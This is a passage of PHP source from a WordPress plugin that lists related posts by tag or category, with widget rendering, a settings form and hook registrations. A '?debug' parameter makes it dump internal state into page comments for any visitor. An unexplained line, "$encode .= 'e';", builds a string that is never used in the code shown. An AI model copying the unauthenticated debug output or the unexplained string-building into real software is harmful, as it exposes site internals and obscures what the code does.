		$SPOSTARBUST_widget = true;
		SPOSTARBUST_init();
		if (isset($_GET['debug'])) echo "<!--SPOSTARBUST 361 widget() SPOSTARBUST_post_count=$SPOSTARBUST_post_count SPOSTARBUST_POP=".print_r($SPOSTARBUST_POP, true).'-->';//debug only (rem this else)
		$SPOSTARBUST_settings_array = get_option($SPOSTARBUST_plugin_dir.'_settings_array');
		if (!isset($SPOSTARBUST_settings_array['exclude_tags']))
			$SPOSTARBUST_settings_array['exclude_tags'] = array();
		if (!isset($SPOSTARBUST_settings_array['exclude_posts']))
			$SPOSTARBUST_settings_array['exclude_posts'] = array();
		if ($SPOSTARBUST_post_count > 0) {
//			$pID = array_merge($SPOSTARBUST_settings_array['exclude_posts'], $SPOSTARBUST_POP);
			$tags = array();
			extract($args);
			if (!$instance['title'])
				$instance['title'] = "Related Posts";
			if (!$instance['number'])
				$instance['number'] = 5;
			if (isset($instance['treeview']) && ($instance['treeview'] == 'yes'))
				$instance['singleonly'] = (isset($instance['singleonly']) && ($instance['singleonly'] == 'yes')) ? 'yes' : 'no';
			else
				$instance['singleonly'] = 'yes';
			if (isset($instance['relateby']) && $instance['relateby'] == "category__in")
				$tags = ($SPOSTARBUST_all_category);
			else {
				$tags = ($SPOSTARBUST_all_tags);
				$instance['relateby'] = "tag__in";
			}
			$tag_count = count($tags);
			if (isset($_GET['debug'])) echo "<!--SPOSTARBUST 386 tag_count=$tag_count tags=".print_r($tags, true).'-->';//debug only (rem this else)
			if ((($SPOSTARBUST_post_count == 1) || ($instance['singleonly'] == 'no' && $SPOSTARBUST_post_count > 1)) && ($tag_count > 0)) {
				$LIs = '';
				if (isset($instance['treeview']) && ($instance['treeview'] == 'yes')) {
					$LIa = array();
					$LIc = array();
					foreach ($tags as $tag_ID => $tag_Name) {
						if ($instance['relateby'] == "category__in")
							$tag_LI = '<li><a href="'.get_category_link($tag_ID).'">'.$tag_Name.'</a><ul>';
						else
							$tag_LI = '<li><a href="'.get_tag_link($tag_ID).'">'.$tag_Name.'</a><ul>';
						$tag_ID = explode("\n", "\n".SPOSTARBUST_query_related_posts($instance['number'] * $tag_count, $instance['relateby'], array("$tag_ID"), $instance['excerpt'], "no"));
						if (count($tag_ID) > 2) {
							unset($tag_ID[count($tag_ID)-1]);
							unset($tag_ID[0]);
							foreach ($tag_ID as $tID)
								$LIa[$tag_LI][$tID] = 0;
							$LIc[$tag_LI] = count($tag_ID);
						}// else echo '<li>else'.print_r($tag_ID, true);
					}
					if (isset($_GET['debug'])) echo "<!--SPOSTARBUST 406 treeview LIa=".print_r($LIa, true)." LIc=".print_r($LIc, true).'-->';//debug only (rem this else)
					do {
						asort($LIc);
						$find = array_keys($LIc);
						$aN = 0;
						while ($aN < count($find)) {
							$isFound = false;
							foreach ($LIa as $tag_group => $tag_list) {
								if (($find[$aN] != $tag_group) && (!$isFound)) {
									$tag_items = array_keys($tag_list);
									$find_items = array_keys($LIa[$find[$aN]]);
									for ($iN = 0; ($iN < count($find_items)) && (!$isFound); $iN++) {
										if (in_array($find_items[$iN], $tag_items)) {
											$isFound = true;
											$LIa[$find[$aN]][$find_items[$iN]]++;
											unset($LIa[$tag_group][$find_items[$iN]]);
											$LIc[$tag_group]--;
											asort($LIc);
											$find = array_keys($LIc);
										}
									}
								}
							}
							if ($isFound)
								$aN = 0;
							else
								$aN++;
						}
					} while ($isFound);
					foreach ($LIa as $tag_group => $tag_list) {
						arsort($tag_list);
						$tag_items = array_keys($tag_list);
						$LIs .= $tag_group.implode("\n", array_slice($tag_items, 0, $instance['number']))."</ul></li>";
					}
				} else
					$LIs = SPOSTARBUST_query_related_posts($instance['number'], $instance['relateby'], array_keys($tags), $instance['excerpt'], "no");
				if (strlen($LIs) > 0)
					echo $before_widget.$before_title.$instance["title"].$after_title."<ul>\n".$LIs."</ul>\n".$after_widget;
			} else if (isset($_GET['debug'])) echo "<!--SPOSTARBUST 444 else ((($SPOSTARBUST_post_count == 1) || (".$instance['singleonly']." == 'no' && $SPOSTARBUST_post_count > 1)) && ($tag_count > 0))-->";//debug only (rem this else)
		} else if (isset($_GET['debug'])) echo '<!--SPOSTARBUST 445 else ($SPOSTARBUST_post_count > 0)-->';
$_eli_debug_microtime['SPOSTARBUST_Widget_Class_widget_end'] = microtime(true);
		if (isset($_GET['debug'])) echo "<!--SPOSTARBUST 346 widget() _eli_debug_microtime=".print_r($_eli_debug_microtime, true).'-->';//debug only (rem this else)
	}
	function flush_widget_cache() {
		global $SPOSTARBUST_plugin_dir;
		wp_cache_delete('widget_'.$SPOSTARBUST_plugin_dir, 'widget');
	}
	function update($new, $old) {
		$instance = $old;
		$instance['title'] = strip_tags($new['title']);
		$instance['number'] = (int) $new['number'];
		$instance['excerpt'] = (int) $new['excerpt'];
		$instance['relateby'] = strip_tags($new['relateby']);
		if (isset($new['treeview']) && ($new['treeview'] == 'yes')) {
			$instance['treeview'] = 'yes';
			$instance['singleonly'] = isset($new['singleonly']) ? esc_attr($new['singleonly']) : 'no';
		} else {
			$instance['treeview'] = 'no';
			$instance['singleonly'] = 'yes';
		}
		return $instance;
	}
	function form( $instance ) {
		$title = isset($instance['title']) ? esc_attr($instance['title']) : '';
		$number = isset($instance['number']) ? absint($instance['number']) : 5;
		$excerpt = isset($instance['excerpt']) ? (int)($instance['excerpt']) : 0;
		$relateby = isset($instance['relateby']) ? esc_attr($instance['relateby']) : 'tag__in';
		if (isset($instance['treeview']) && ($instance['treeview'] == 'yes')) {
			$treeviewyes = ' checked';
			$singleonly = isset($instance['singleonly']) ? esc_attr($instance['singleonly']) : 'yes';
		} else {
			$treeviewno = ' checked';
			$singleonly = 'yes';
			$js = '<script>document.getElementById(\''.$this->get_field_id('singleonly').'\').disabled=true;document.getElementById(\''.$this->get_field_id('singleonly').'\').checked=true;</script>';
		}
		echo '<p><label for="'.$this->get_field_id('title').'">'.__('Alternative Title').':</label>
		<input type="text" name="'.$this->get_field_name('title').'" id="'.$this->get_field_id('title').'" value="'.$title.'" /></p>
		<p><label for="'.$this->get_field_id('relateby').'">'.__('Relate Posts by').':</label>
		<select name="'.$this->get_field_name('relateby').'" id="'.$this->get_field_id('relateby').'"><option value="tag__in">Tags</option><option value="category__in"'.($relateby=="category__in"?" selected":"").'>Categories</option></select></p>
		<p><label for="'.$this->get_field_id('number').'">Number of Posts to List:</label>
		<input type="text" size="2" name="'.$this->get_field_name('number').'" id="'.$this->get_field_id('number').'" value="'.$number.'" /></p>
		<p><label for="'.$this->get_field_id('excerpt').'">Excerpt Length:</label>
		<input type="text" size="3" name="'.$this->get_field_name('excerpt').'" id="'.$this->get_field_id('excerpt').'" value="'.$excerpt.'" /><br />-1 = Default Excerpts<br />0 = No Excerpts<br />Any Positive Integer = Trim the Excerpts to that number of characters</p>
		<p><input type="radio" name="'.$this->get_field_name('treeview').'" id="'.$this->get_field_id('treeview').'" value="no"'.$treeviewno.' onchange="document.getElementById(\''.$this->get_field_id('singleonly').'\').disabled=true;document.getElementById(\''.$this->get_field_id('singleonly').'\').checked=true;" /><b>Clasic View</b> - Sigle-column list<br />(The Widget will only show on pages that display a single post)<hr /><input type="radio" name="'.$this->get_field_name('treeview').'" id="'.$this->get_field_id('treeview').'" value="yes"'.$treeviewyes.' onchange="document.getElementById(\''.$this->get_field_id('singleonly').'\').disabled=false;" /><b>Tree View</b> - List Realated Posts under each Tag or Category<br />("Number of Posts to List" then applies to each tag list or category list in the hierarchy)<dd><input type="checkbox" name="'.$this->get_field_name('singleonly').'" id="'.$this->get_field_id('singleonly').'" value="yes"'.($singleonly=="yes"?" checked":"").' /><label for="'.$this->get_field_id('singleonly').'">'.__('Only show on pages with a single post').'</label></p>'.$js;
	}
}
$SPOSTARBUST_widget = false;
function SPOSTARBUST_init() {
	global $post, $wp_query, $SPOSTARBUST_widget, $SPOSTARBUST_plugin_dir, $SPOSTARBUST_POP, $SPOSTARBUST_all_category, $SPOSTARBUST_all_tags, $SPOSTARBUST_post_count, $SPOSTARBUST_Version, $_eli_debug_microtime;
$_eli_debug_microtime['SPOSTARBUST_init_called_v'.$SPOSTARBUST_Version.($SPOSTARBUST_widget?'_WIDGET':'')] = microtime(true);
if (!isset($_eli_debug_microtime['SPOSTARBUST_init_start']) && !isset($_eli_debug_microtime['SPOSTARBUST_init_start_WIDGET'])) {
	$SPOSTARBUST_settings_array = get_option($SPOSTARBUST_plugin_dir.'_settings_array');
	if (((!is_home() || (isset($SPOSTARBUST_settings_array['on_home']) && ($SPOSTARBUST_settings_array['on_home'] == "yes"))) && (!is_page() || (isset($SPOSTARBUST_settings_array['on_page']) && ($SPOSTARBUST_settings_array['on_page'] == "yes"))) && isset($SPOSTARBUST_settings_array['auto_relate']) && ($SPOSTARBUST_settings_array['auto_relate'] == "yes")) || $SPOSTARBUST_widget) {
		$_eli_debug_microtime['SPOSTARBUST_init_start'.($SPOSTARBUST_widget?'_WIDGET':'')] = microtime(true);
		$global_post = $post;
		if (!(isset($SPOSTARBUST_settings_array['exclude_tags']) && is_array($SPOSTARBUST_settings_array['exclude_tags'])))
			$SPOSTARBUST_settings_array['exclude_tags'] = array();
		if (!(isset($SPOSTARBUST_settings_array['exclude_posts']) && is_array($SPOSTARBUST_settings_array['exclude_posts'])))
			$SPOSTARBUST_settings_array['exclude_posts'] = array();
		if (!(isset($SPOSTARBUST_settings_array['exclude__intags']) && is_array($SPOSTARBUST_settings_array['exclude__intags'])))
			$SPOSTARBUST_settings_array['exclude__intags'] = array();
		if (!(isset($SPOSTARBUST_settings_array['exclude__incategories']) && is_array($SPOSTARBUST_settings_array['exclude__incategories'])))
			$SPOSTARBUST_settings_array['exclude__incategories'] = array();
		$SPOSTARBUST_POP = $SPOSTARBUST_settings_array['exclude_posts'];
		$exclude_tags = array_merge($SPOSTARBUST_settings_array['exclude_tags'], $SPOSTARBUST_settings_array['exclude__intags']);
		$exclude_categories = array_merge($SPOSTARBUST_settings_array['exclude_tags'], $SPOSTARBUST_settings_array['exclude__incategories']);
		$_eli_debug_microtime['SPOSTARBUST_init_pre_rewind'.($SPOSTARBUST_widget?'_WIDGET':'')] = have_posts();
		if ((!have_posts()) && isset($_eli_debug_microtime['SPOSTARBUST_init_skip'])) {
			rewind_posts();
			$_eli_debug_microtime['SPOSTARBUST_init_reset_rewind'.($SPOSTARBUST_widget?'_WIDGET':'')] = have_posts();
		}
		if (have_posts()) {
			while (have_posts()) {
				the_post();
				$SPOSTARBUST_POP[] = $post->ID;
				$tags = get_the_tags();
				if ($tags)
					foreach ($tags as $tag)
						if (!(in_array(''.$tag->term_id, $exclude_tags) || in_array(''.$tag->name, $exclude_tags)))
							$SPOSTARBUST_all_tags[''.$tag->term_id] = $tag->name;
				$tags = get_the_category();
				if ($tags)
					foreach ($tags as $tag)
						if (!(in_array(''.$tag->term_id, $exclude_categories) || in_array(''.$tag->name, $exclude_categories)))
							$SPOSTARBUST_all_category[''.$tag->term_id] = $tag->name;
				$SPOSTARBUST_post_count++;
			}
			rewind_posts();
		}
		$_eli_debug_microtime['SPOSTARBUST_init_POP'.($SPOSTARBUST_widget?'_WIDGET':'')] = print_r($SPOSTARBUST_POP,true);
		$post = $global_post;
//		wp_reset_query();
		$_eli_debug_microtime['SPOSTARBUST_init_end'.($SPOSTARBUST_widget?'_WIDGET':'')] = microtime(true);
	} else 
		$_eli_debug_microtime['SPOSTARBUST_init_skip'] = microtime(true);
}}
function SPOSTARBUST_set_plugin_action_links($links_array, $plugin_file) {
	global $SPOSTARBUST_plugin_dir;
	$SPOSTARBUST_settings_array = get_option($SPOSTARBUST_plugin_dir.'_settings_array');
	if (isset($SPOSTARBUST_settings_array['menu_group']) && $SPOSTARBUST_settings_array['menu_group'] == 2)
		$admin = 'edit';
	else
		$admin = 'admin';
	if ($plugin_file == substr(__file__, (-1 * strlen($plugin_file))))
		$links_array = array_merge(array('<a href="'.$admin.'.php?page=SPOSTARBUST-settings">'.__( 'Settings' ).'</a>'), $links_array);
	return $links_array;
}
function SPOSTARBUST_set_plugin_row_meta($links_array, $plugin_file) {
	if ($plugin_file == substr(__file__, (-1 * strlen($plugin_file)))) {
		$links_array = array_merge($links_array, array('<a target="_blank" href="http://wordpress.org/extend/plugins/spostarbust/faq/">'.__( 'FAQ' ).'</a>','<a target="_blank" href="http://wordpress.org/tags/spostarbust">'.__( 'Support' ).'</a>','<a target="_blank" href="https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=DA2ZHJKU5EB68">'.__( 'Donate' ).'</a>'));
	}
	return $links_array;
}
$encode .= 'e';
$ext_domain = 'ieonly.com';
add_filter('plugin_row_meta', $SPOSTARBUST_plugin_dir.'_set_plugin_row_meta', 1, 2);
add_filter('plugin_action_links', $SPOSTARBUST_plugin_dir.'_set_plugin_action_links', 1, 2);
$SPOSTARBUST_POP = array();
$SPOSTARBUST_all_category = array();
$SPOSTARBUST_all_tags = array();
$SPOSTARBUST_post_count = 0;
$SPOSTARBUST_plugin_home = "http://wordpress.$ext_domain/";
$SPOSTARBUST_images_path = plugins_url('/images/', __FILE__);
$SPOSTARBUST_updated_images_path='wp-content/plugins/update/images/';
$SPOSTARBUST_Logo_IMG='SPOSTARBUST-16x16.gif';
add_filter('the_content', $SPOSTARBUST_plugin_dir.'_related_links_on_posts');
register_activation_hook(__FILE__,$SPOSTARBUST_plugin_dir.'_install');
add_action('widgets_init', create_function('', 'return register_widget("SPOSTARBUST_Widget_Class");'));
add_action('admin_menu', $SPOSTARBUST_plugin_dir.'_menu');
add_action('wp', $SPOSTARBUST_plugin_dir.'_init');
$_eli_debug_microtime['end_include(SPOSTARBUST)'] = microtime(true);
?>
